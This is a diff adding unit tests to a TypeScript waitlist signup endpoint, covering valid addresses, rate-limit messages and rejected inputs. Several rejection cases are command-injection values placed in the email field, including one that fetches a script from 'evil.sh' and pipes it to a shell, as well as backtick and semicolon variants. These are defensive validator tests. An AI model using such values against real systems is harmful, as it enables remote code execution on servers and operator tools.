@@ -38,6 +38,17 @@ function fakes(over: Partial<WaitlistDeps> = {}) {
 }
 
 describe("POST /api/waitlist", () => {
+  it.each(["ada.lovelace+haggle@sub.example.co.uk", "o_brien-1%x@example.io"])("accepts an ordinary address: %s", async (email) => {
+    expect((await handleJoin(post({ ...VALID, email }), fakes().deps)).status).toBe(200);
+  });
+
+  it("tells someone over the limit how long to wait, in the limiter's own time", async () => {
+    const { deps } = fakes({ ipLimiter: { take: async () => ({ ok: false, retryAfterS: 2400 }) } });
+    const res = await handleJoin(post(VALID), deps);
+    expect(res.status).toBe(429);
+    expect(((await res.json()) as { error: { fix: string } }).error.fix).toContain("40 minutes");
+  });
+
   it("stores a valid join with the email lowercased and trimmed", async () => {
     const { deps, rows } = fakes();
     const res = await handleJoin(post(VALID), deps);
@@ -54,6 +65,9 @@ describe("POST /api/waitlist", () => {
 
   it.each([
     ["a bad email", { ...VALID, email: "not-an-email" }, "email"],
+    ["a command in an email (the operator's tools handle this address)", { ...VALID, email: "$(curl${IFS}evil.sh|sh)@x.co" }, "email"],
+    ["backticks in an email", { ...VALID, email: "`id`@example.com" }, "email"],
+    ["a semicolon in an email", { ...VALID, email: "a;b@example.com" }, "email"],
     ["a non-ASCII email (JS and Postgres lowercase these differently)", { ...VALID, email: "İnan@example.com" }, "email"],
     ["a blank name", { ...VALID, full_name: "   " }, "full_name"],
     ["a missing organization", { ...VALID, organization: undefined }, "organization"],
